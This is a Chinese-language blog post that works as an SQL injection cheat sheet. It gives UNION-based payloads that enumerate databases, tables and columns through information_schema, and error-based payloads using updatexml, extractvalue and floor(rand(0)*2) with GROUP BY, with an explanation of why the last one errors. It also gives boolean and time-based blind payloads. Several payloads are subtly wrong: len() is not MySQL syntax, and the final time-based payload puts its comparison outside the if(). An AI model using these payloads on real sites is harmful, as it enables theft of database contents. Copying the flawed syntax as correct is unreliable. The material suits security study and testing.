---
layout: post
title: "SQL注入"
date:   2021/4/9
tags: [OWASP top 10]
comments: true
author: c-uncle
---

# SQL注入的基本步骤

1. 先判断注入点
2. 有回显 or 无回显
3. 判断字段数
4. 查库名（如果不打算获取其他数据库的数据，可以跳过）
5. 查表名
6. 查具体数据

# 常规注入姿势

## 联合查询

### 查询库名

union select 1,group_concat(schema_name),3 from information_schema.schemata--+

### 查询表名

union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+

### 查询字段名

 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name='xxx'--+



## 报错注入

### 原理

利用mysql的逻辑错误，使程序返回带有数据的错误信息。

### 各种姿势

#### updatexml

payload：updatexml(1,concat(0x7e,(select user()),0x7e),1)

updatexml有字符数限制，最多显示32位，需要根据实际情况，结合length和substring来获取数据

#### extractvalue

payload：extractvalue(1,concat(0x7e,(select user()),0x7e))

和updatexml一样有字符数限制。

#### rand()+group by+conut()组合拳

**注意：这套组合拳在mysql8.0下无效**

这套组合拳的原里是利用虚拟表无法重复写入同一个键名来报错。

---

###### 背景知识

**group by** 可以对一个列或多个列进行分组。

group by 的虚拟表工作步骤：

1. 确定分组因子
2. 分组因子在虚拟表中没有记录，添加记录
3. 有记录，更新记录

**rand(0)**  可以随机生成0-1之间的实数，floor(rand(0)\*2)确保了生成的值只可能是0或1。

同时，rand是有规律的，floor(rand(0)\*2)生成的值会是011011循环。

---

程序在使用 **group by** 时会创建一个虚拟表来统计列出现的次数。

这个虚拟表是不允许重复写入同一个键的。

以 **select * from user group by floor(rand(0)\*2)** 为例。

程序会将select * from user的查询结果按floor(rand(0)\*2)分组。

假设user表中有三行数据。

对于第一条数据，

当group by 被执行时，需要先确定分组因子，也就是要先执行一次floor(rand(0)\*2)（第一次执行，结果为0）。

同时，程序遍历虚拟表，发现没有0，那么就会去添加键值为0的记录。

但是，程序在添加记录时，会再次执行floor(rand(0)\*2)（第二次执行，结果为1），导致添加到虚拟表里的记录是键值为1的记录。

对于第二条数据，floor(rand(0)\*2)第三次执行，结果为1，所以虚拟表会更新键值为1的记录。

对于第三条数据，floor(rand(0)\*2)第四次执行，结果为0，键值为0的记录不存在，于是准备添加记录。然而在添加时，floor(rand(0)\*2)第五次执行，结果为1。于是就变成要添加键值为1的记录。可是1的记录已经存在了，这时候就报错了。

**注意：一定要是rand(0)**

payload：union select count(\*), concat(':', (select group_concat(schema_name) from information_schema.schemata),':', floor(rand(0)*2)) as a,3 from information_schema.schemata group by a--+

用上面的payload演变出来的payload查具体数据是拿不到数据的，用来查表名，查字段名都正常。

查具体数据的payload：payload:id=1" union select count(\*), concat(':', (select concat(email_id, ':', id) from emails limit 1,1),':', floor(rand(0)*2)) as a,3 from information_schema.schemata group by a--+

#### uuid相关函数

payload:  1234' union SELECT 1, UUID_TO_BIN((select database()))#

可用于mysql8.0



## 布尔盲注

如果程序对于sql语句的不同执行结果，会返回不同的响应。利用这个特点，我们可以结合逻辑运算和len，substring，来猜测数据。

当sql语句执行结果永真或永假时，显示的页面是不同的，我们就可以使用盲注。

### 猜长度

payload: id=1' and len(select user())=**1**--+

### 猜具体数据

payload: id=1' and  substring((select user()), **1**,1) ='**a**'--+

## 时间盲注

当sql语句执行结果永真或永假时，响应是一样的。这时不能使用布尔盲注。

但是利用if语句和sleep函数，但if条件成立，sleep执行，使得响应时间变长，利用这一特点来猜测数据。

### 猜长度

payload: id=1' and if(len(select user())=**1**, sleep(5), 0)--+

### 猜具体数据

payload: id=1' and  if(substring((select user()), **1**,1), sleep(5), 0) ='**a**'--+